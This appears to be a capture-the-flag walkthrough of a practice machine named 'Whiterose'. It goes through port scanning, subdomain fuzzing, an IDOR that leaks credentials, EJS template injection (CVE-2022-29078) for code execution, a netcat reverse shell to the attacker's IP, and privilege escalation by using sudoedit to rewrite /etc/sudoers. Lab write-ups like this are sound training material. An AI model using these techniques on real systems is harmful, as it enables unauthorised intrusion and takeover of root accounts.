# Initial Reconnaissance

Let’s do an nmap scan:

```bash
nmap -sVC -A -T4 -p- whiterose.thm -oN nmapscan.txt
```

### Nmap Scan Results

Click on the image above to enlarge the scan results.

### Ports Found in Open State From nmap scan

**Port 22:**

```
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
```

**Port 80:**

```
80/tcp open http nginx 1.14.0 (Ubuntu)
```

Let’s check the HTTP port (port number 80) by going to:

```
http://whiterose.thm
```

When trying to access Port 80 (http://whiterose.thm), we are redirected to a new URL:

```
http://cyprusbank.thm
```

Time to add another entry to our `/etc/hosts` file:

```
10.10.x.x cyprusbank.thm
```

10.10.x.x is your IP address of this Room → could differ for you. Let’s refresh the page after setting the new domain entry in `/etc/hosts`.

There is not much found from the newly discovered URL.

### Time to Directory Brute-Force (gobuster)

```bash
gobuster dir -u http://cyprusbank.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o results.txt
```

This is starting to get a little bit boring now...

### Let’s do a Sub-Domain Brute Force (FFUF)

```bash
ffuf -u http://whiterose.thm/ -H "HOST: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 1
```

We found a new sub-domain → `admin.cyprusbank.thm`.

Let’s now again add the sub-domain entry to `/etc/hosts`:

```
10.10.x.x admin.cyprusbank.thm
```

Now after adding the sub-domain entry to `/etc/hosts`, let’s check the page:

```
http://admin.cyprusbank.thm
```

We have got a login page at `admin.cyprusbank.thm`.

Can we use these credentials: `Olivia Cortez : olivi8` on this page? Let’s find out...

Wow... Credentials worked! 😮

There are 5 menus in the header section:

- Home
- Search
- Settings
- Messages
- Logout

**Question 1:** What’s Tyrell Wellick’s phone number?

Let’s try the search tab to look for Tyrell Wellick’s phone number.

Upon exploring, we found an entry of Tyrell Wellick in Recent Payments. It’s in asterisk, which means that the user we are logged into doesn’t have proper privileges to check the PII or private information. We have to upgrade the user or use a higher privilege user account.

In the message section, we see the ending URL has a number. The vulnerability we can try here is called Insecure Direct Object Reference (IDOR). This occurs when an application exposes a reference to an internal object (like a database record or file) directly in the URL. If there are no proper access controls or authorization checks, attackers can manipulate these references (in your case, changing the `c` parameter in the URL) to access resources they’re not authorized to view.

In this case, changing `?c=1`, `?c=2`, etc., might reveal different messages or records without proper permission checks, allowing unauthorized access to sensitive data. IDOR vulnerabilities are part of the broader Broken Access Control category in the OWASP Top 10.

Now let’s try this out:

Voila! We found credentials on `?/c=8` for another user named:

```
Gayle Bev : p~]P@5!6;rs558:q
```

Now let’s log out from our current session and log in to Gayle Bev.

We are able to successfully log in as user Gayle Bev.

Let’s look for an entry which has the name `Tyrell Wellick` using the search tab while logged in to the user `Gayle Bev`.

We found the phone number of Tyrell Wellick:

```
Answer (Redacted): 842-0**-****
```

Tyrell Wellick → “Man! Now they have my phone number” 😂

**Next up:** What is the `user.txt` flag?

## Gaining Foothold

While still being logged in as user `Gayle Bev`, we are able to now access the Settings page as user `Gayle Bev`. In the customer settings page, there are two entries:

- Enter a Customer Name
- Enter a New Password

Now keeping in mind that there are a lot of customer names on the home page, I tried entering the individual name and tried entering a new password, so that I can use these credentials to log into that account, just like we did earlier, but it doesn’t work that way.

Time to use our favorite tool → Burp Suite.

Sending the request to Burp Suite as `user:pass` → `admin:admin`. User and password can be set to anything. Let’s get our request to Repeater in Burp Suite.

After sending the request to Repeater and sending the request, we see a `200 OK` return. Let’s play with the parameters of password from `password` to `passworda`. You can also remove the placeholder password. The objective here is to return an error code (`500`).

We found `/home/web/app/views/settings.ejs`. The file path `/home/web/app/views/settings.ejs` likely points to an EJS (Embedded JavaScript) template file used in a Node.js or Express.js web application.

After doing a little research, I found an EJS SSTI vulnerability:

[CVE-2022-29078] → EJS Server Side Template Injection RCE → PoC (Link to the writeup below)

[EJS, Server side template injection RCE (CVE-2022-29078) - writeup](https://eslam.io)

For some reason, Medium doesn’t allow to show the RCE command on this post but you can take the reference from this section.

In this PoC, we are using port `1337`, but for this writeup, I will be using port `1234` for the reverse shell. You can continue with the default one if you want.

Don’t forget to start the Netcat session:

For this case, replacing the reverse shell used in PoC → `nc -e sh IP-address PORT` by that of BusyBox from `revshells.com` gave us the reverse shell successfully.

We are now going to get the web reverse shell from the PoC using the BusyBox `nc` command.

Let’s upgrade our reverse shell to TTY. Upgrading to a TTY (teletype) shell allows you to interact with it more reliably.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then,

```bash
export TERM=xterm
CTRL + z
stty raw -echo; fg
```

Now we have a stable shell with us. By listing the current directory, we see `user.txt` file.

We got our user flag.

**Next up:** Root machine & find the `root.txt` flag.

The very first thing to always check is by doing:

```bash
sudo -l
```

The `sudo -l` command displays a list of commands that the current user is allowed to run with sudo privileges on the system.

The user `web` that we have the shell currently can run this command with root privileges:

```
(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

On doing some more research, you can find the Sudoedit Privilege Escalation technique from the blog post:

[Sudoedit Privilege Escalation | Exploit Notes](https://exploit-notes.hdks.org)

We are going to use Step 1 from the article:

```bash
export EDITOR="vim -- /etc/sudoers"
```

We have exported the editor to VIM, now we are going to edit the `/etc/sudoers` file.

For this, we need to check our user, which is `web`.

Now we need to add user `web` to the sudoers list:

```
web ALL=(ALL:ALL) ALL
```

Now we are able to open the text editor VIM for editing the sudoers list.

Let’s use the command we found from `sudo -l`.

Now we can add the entry right next to the root entry:

```
web ALL=(ALL:ALL) ALL
```

Now after adding the above entry for user `web` to the sudoers file, don’t forget to save it using the command `:wq`.

We can now run:

```bash
sudo su
```

to gain root access.

Then change the directory to `/root` and `cat` the flag:

```bash
cd /root
cat root.txt
```

We are now root!